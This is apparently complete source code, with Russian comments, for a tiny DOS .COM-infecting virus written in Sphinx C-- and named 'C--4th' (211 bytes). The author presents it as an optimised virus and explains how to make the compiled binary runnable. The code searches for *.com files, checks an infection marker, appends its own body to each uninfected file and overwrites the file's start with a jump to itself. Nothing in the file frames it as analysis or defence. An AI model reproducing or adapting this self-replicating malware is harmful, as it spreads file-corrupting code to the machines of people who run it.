/* Вот немного посидел,соптимизировал...

Name:	C--4th
Size:	211
Type:	Trivial.Com

Для запуска нужно добавить 4 NOP'a в начало скомпилированного виря

*/

/* Описания флагов компилятора */
?alignword		0		/* нет выравнивания */
?argc			0		/* не разбираем коммандную строку */
?ctrl_c			0		/* нет процедуры обработки ctrl-c */
?parsecommandline	0		/* аналогично argc */
?resize			0		/* Нет процедуры изменения блока 
						памяти */ 
?codesize				/* Оптимизация по размеру */
?jumptomain		short		/* Нет прыжка на Main */
?startaddress		0		/* org 0 */
/* Некоторые include */
?include "dos.h--"

?define	vlen		211

byte	old[4] = {0x90,0xCD,0x20,0x90};	/* Первоначальный носитель */
byte	jmpc   = 0xE9;
word	jofs   = 0;
byte	mark   = 0x40;

/*---------------------------------------------------------------*/
main()
struct	fileinfo
{
byte	stuff[21];
byte	fattr;
word	ftime;
word	fdate;
dword	fsize;
byte	fname[13];
} dta;
{
 $call lbl
lbl:
 $pop  SI
 $sub  SI,#lbl

 DI = 0x100;
 $push DI
 $push SI
 SI = SI + #old;
 $movsw;		/* Восстановим носитель */
 $movsw;		/* Естественно можно использовать for но зачем ? */
 $pop  SI

 setDTA(SS,#dta);		/* Установим Dta */
 if (@FINDFIRSTFILE(,,0,#fmask+SI) == 0)
  {
   do
    {
      BX = FOPEN(2,,,#dta.fname);	/* Откроем найденый файл */
      @FREAD(,BX,4,#old+SI);		/* Прочитаем 4 байта */
       if (old[3+SI] != 0x40)		/* Есть метка заражения ? */
         {
          @FSEEK(2,BX,0,0);		/* Прыгаем на конец файла */
          $push AX;			/* Сохраним размер */
          @FWRITE(,BX,vlen,SI);		/* Пишим нас */
          $pop  AX;
	  jofs[SI] = AX - 3;
          @FSEEK(0,BX,0,0);		/* На начало файла */
          @FWRITE(,BX,4,#jmpc+SI);	/* Пишим Jmp */
         }
       @FCLOSE(,BX);			/* Закрываем файл */
    } while(@FINDNEXTFILE() == 0); 
  }
}					/* компилятор вставит ret */
byte	fmask = "*.com";		/* Собственно маска */
